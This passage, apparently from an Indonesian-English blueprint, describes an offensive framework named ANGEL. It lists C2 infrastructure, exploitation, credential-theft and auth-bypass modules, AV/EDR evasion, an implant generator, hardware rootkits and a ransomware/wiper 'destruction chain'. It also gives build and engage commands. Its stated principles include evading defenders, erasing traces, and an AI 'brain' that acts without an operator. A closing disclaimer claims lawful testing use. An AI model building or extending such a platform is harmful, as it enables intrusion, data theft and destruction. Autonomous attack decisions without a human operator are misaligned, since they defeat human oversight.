autonomous_decision.go — Analyze environment, decide next action
risk_assessment.go     — Risk score per action (safe vs risky)
behavior_learning.go   — Self-learning dari history
timing_control.go      — Adaptive timing (suspicious → sleep longer)
```

---

## 6. INFRASTRUKTUR & PELAPORAN (LAYER 16–21)

### 6.1 Infrastructure

```
TERRAFORM:   VPS provisioning, VPC separation (4 nodes)
ANSIBLE:     Playbooks, Roles (recon, phishing, c2, dns, wireguard, nginx, firewall)
REDIRECTOR:  Nginx URI routing, SSL, Decoy, Header validation, Rate limit
VPN:         WireGuard, OpenVPN, IPsec
ROTATION:    IP (1-3s), Proxy chain, UA, TLS fingerprint
```

**Functional Separation:**
```
VPC #1: Recon & Scanning (Subfinder, Nmap, Shodan)
VPC #2: Phishing (GoPhish, credential harvest)
VPC #3: C2 HTTPS (Teamserver, listeners)
VPC #4: C2 DNS (DNS listener, backup)
```

---

### 6.2 OSINT & Reconnaissance

```
DNS (5):     Subdomain enum, Reverse DNS, Zone transfer, Brute force, History
PORT (4):    TCP/UDP scan, Service fingerprint, Banner grab, Network map
WEB (6):     Tech fingerprint, WAF detect, CMS/framework detect, SSL cert, Robots
PERSON (5):  Email harvest, Social media, Git recon, LinkedIn, Breach data
COMPANY (5): ASN, Netblock, Cert transparency, crt.sh, Shodan
CLOUD (4):   AWS bucket, Azure blob, GCP bucket, Public S3
```

---

### 6.3 Exploitation

```
XSS (6):      Reflected, Stored, DOM, Blind, Polyglot, Cookie Steal
SSRF (4):     Internal scan, Cloud metadata, File read, Port scan
RCE (4):      Command injection, Code injection, Deserialization, SSTI
LFI/RFI (3):  File read, File write, Remote include
GRAPHQL (3):  Introspection, Nested query, Injection
API (3):      Parameter, JSON, XML injection
CVE (3):      Scanner, Exploiter, Exploit DB
```

---

### 6.4 Forensic Evidence

```
LEDGER:       Hash chain, Timestamp, Sequence, Parent-child, Digital signature
COLLECTOR:    Request/response capture, Screenshot, Diff, Telemetry reference
REDACTION:    PII filter, Secret filter, Token filter, Cert filter
STORAGE:      Local, Encrypted, S3 upload
VERIFICATION: Independent verify, Replay verify, Integrity check
```

---

### 6.5 Reporting

```
TECHNICAL:  Full report, Executive summary, Findings, Evidence,
            Reproduction, Remediation, Timeline
EXECUTIVE:  Summary, Impact, Recommendation, Risk score
METRICS:    Severity (P0-P5), Confidence, Impact, Business impact, ROI
DELIVERY:   JSON, Markdown, PDF, Encrypted
```

---

### 6.6 Cleanup & Deletion

```
CREDENTIAL:    Revoke temp creds, Rotate tokens, Delete SSH keys
ARTIFACT:      Delete tools, logs, configs, backups
DB CLEANUP:    Delete Java objects, stored procs, admin accounts, Revert
CACHE VERIFY:  Scan cache, Verify clean
MANIFEST:      Generate, Verify, Export
```

---

## 7. MODUL TAMBAHAN (LAYER 22–25)

### 7.1 Credential Attack & Auth Bypass Engine

```
CRACK:        Hashcat wrapper, John wrapper, Wordlist manager, Rule engine
AUTH BYPASS:  SQLi auth, NoSQL auth, JWT (alg:none, weak secret, kid injection),
              JSON tampering, Default cred, OAuth manipulation, Session hijack
AUTH PROBE:   HTTP bruteforce, Credential stuffing, Password spraying,
              Rate limit bypass, User enum
```

---

### 7.2 Network Evasion & Traffic Morphing

```
IP ROTATION:     Rotate IP/Proxy tiap 1-3 detik
TRAFFIC MORPH:   HTTP/2 fingerprint spoofing, TLS fingerprint, Sleep jitter
PACKET OBFUSC:   Payload encryption, DNS tunneling
PROTOCOL TUNNEL: HTTP, DNS, ICMP, WebSocket
DOMAIN FRONT:    Cloudflare CDN, CloudFront, Azure CDN
```

---

### 7.3 Full Scope Destruction & Impact Chain

```
IMPACT CALCULATOR: Blast radius (data, downtime, user impact)
DESTRUCTION CHAIN: Ransomware/Wiper/DB Drop dengan timing
FULL SCOPE ATTACK: Recon → Attack → Destroy → Report (satu perintah)
```

---

### 7.4 Implant Generator

```
IMPLANT GENERATOR: Generate binary .exe/.bin dengan key enkripsi
IMPLANT BEACON:    Callback ke server (Register, CheckIn, SendResult)
PAYLOAD ENCRYPT:   Enkripsi shellcode anti AV/EDR
```

---

## 8. STATISTIK TOTAL

| Domain | Modul |
|--------|-------|
| C2 Framework | 98+ agents, 18 listeners, Malleable, SMB Beacon, Channel Rotation, Env Detection, Resilience |
| SQL Injection | 60+ modules (8 DBMS, 12+ WAF bypass) |
| NoSQL Injection | 20+ modules (5 DBMS) |
| Database Post-Exploit | 25+ modules (4 DBMS) |
| Evasion & Stealth | 50+ modules (11 sleep, 7 syscall, 15 anti-analysis, 7 injection) |
| AD Attack | 40+ modules (12 Kerberos, 16 ADCS, 8 recon, DCSync, delegation) |
| Lateral Movement | 30+ modules + SMB Beacon |
| Persistence | 40+ modules (4 OS + re-persist) |
| Hardware Rootkit | 20+ modules (UEFI, SMM, Firmware) |
| Credential Theft | 65+ modules (LSASS, Browser, Wallet, Gaming, VPN, Cloud, Token, Session, MFA, Biometric) |
| Collector | 15+ modules |
| Destruction | 30+ modules (timing chain) |
| Orchestrator | 25+ modules (Fireteam + MCP + AI) |
| Brain | 5+ modules |
| Infrastructure | 20+ modules (4 VPC) |
| OSINT | 25+ modules |
| Exploitation | 40+ modules |
| Forensic Evidence | 15+ modules |
| Reporting | 15+ modules |
| Cleanup | 15+ modules |
| Auth Bypass | 20+ modules |
| Network Evasion | 10+ modules |
| Destruction Chain | 3+ modules |
| Implant Generator | 3+ modules |
| **TOTAL** | **~700+ modules** |

---

## 9. PRINSIP DASAR

1. **"No copy-paste"** — tiap baris ditulis sendiri.
2. **"If I can't explain every line, it doesn't go in"**
3. **"Signature-free"** — defender gak kenal.
4. **"Modular"** — tiap modul jalan sendiri, tapi orchestrated.
5. **"Evidentiary"** — tiap action ada bukti.
6. **"Clean"** — post-engagement, semua hilang.
7. **"Resilient"** — setiap kegagalan ada fallback.
8. **"Adaptive"** — beradaptasi dengan environment.
9. **"Autonomous"** — keputusan tanpa operator jika perlu.
10. **"Observable"** — setiap aksi log dan terukur.

---

## 10. CHECKLIST FINAL

| # | Layer | Status |
|---|-------|--------|
| 1 | C2 Framework (98+ Agents + Malleable + SMB Beacon + Channel Rotation + Env Detection + Resilience) | [ ] |
| 2 | The Decoy / Deception Layer | [ ] |
| 3 | SQL Injection Engine (8 DBMS + 12 WAF bypass) | [ ] |
| 4 | NoSQL Injection Engine (5 DBMS) | [ ] |
| 5 | Database Post-Exploit (khunt-style) | [ ] |
| 6 | C2 Evasion (11 Sleep + 7 Syscall + AMSI/ETW + 15 Anti-Analysis + 7 Injection + Logs + Network) | [ ] |
| 7 | AD Attack (12 Kerberos + 16 ADCS + DCSync + Delegation) | [ ] |
| 8 | Lateral Movement (30+ techniques + SMB Beacon + Pivoting) | [ ] |
| 9 | Persistence (11 Win + 9 Linux + 6 Mac + 5 Android + re-persist) | [ ] |
| 10 | Hardware Rootkit (UEFI + SMM + Firmware) | [ ] |
| 11 | Credential Theft (65+ modules) | [ ] |
| 12 | Collector / InfoStealer | [ ] |
| 13 | Destruction (JADEPUFFER + MAD-CAT + Wiper + Timing) | [ ] |
| 14 | Orchestrator (LangGraph + MCP + Fireteam) | [ ] |
| 15 | Autonomous Brain | [ ] |
| 16 | Infrastructure (Terraform + Ansible + 4 VPC) | [ ] |
| 17 | OSINT (DNS/Port/Web/Person/Company/Cloud) | [ ] |
| 18 | Exploitation (XSS/SSRF/RCE/LFI/GraphQL/API/CVE) | [ ] |
| 19 | Forensic Evidence | [ ] |
| 20 | Reporting | [ ] |
| 21 | Cleanup | [ ] |
| 22 | Auth Bypass Engine | [ ] |
| 23 | Network Evasion | [ ] |
| 24 | Full Scope Destruction | [ ] |
| 25 | Implant Generator | [ ] |

---

## 11. TIMELINE PENGERJAAN

| Phase | Fokus | Target |
|-------|-------|--------|
| Phase 1 | Layer 1-5 | Minggu 1-2 |
| Phase 2 | Layer 6-10 | Minggu 3-4 |
| Phase 3 | Layer 11-15 | Minggu 5-6 |
| Phase 4 | Layer 16-21 | Minggu 7-8 |
| Phase 5 | Layer 22-25 | Minggu 9-10 |

---

## 12. DOKUMENTASI CARA PAKAI

### Setup
```bash
git clone https://github.com/angel-framework/angel.git
cd angel && make setup
cp .env.example .env && edit .env
```

### Deployment
```bash
make infra-deploy ENV=production
make c2-deploy
make orchestrator-deploy
```

### Operasional
```bash
make listeners-start
make implant-generate OS=windows TARGET=x64
make dashboard
make engage SCOPE=target.txt
```

### Post-Engagement
```bash
make cleanup
make report FORMAT=pdf
make verify-clean
```

---

## 13. KESIMPULAN

ANGEL adalah platform offensive security tingkat lanjut untuk P0/P1 findings. Setiap layer memiliki minimal 5-7 teknik alternatif, fallback otomatis, deteksi environment, adaptasi, edge case handling, resilience, dan recovery.

---

## 14. LEGAL & SAFETY DISCLAIMER

> **PENTING:** Blueprint ini hanya untuk tujuan pendidikan, penelitian, dan pengujian keamanan yang sah. Dilarang keras menggunakan untuk menyerang sistem tanpa izin tertulis. Pelanggaran dikenakan sanksi pidana dan perdata.
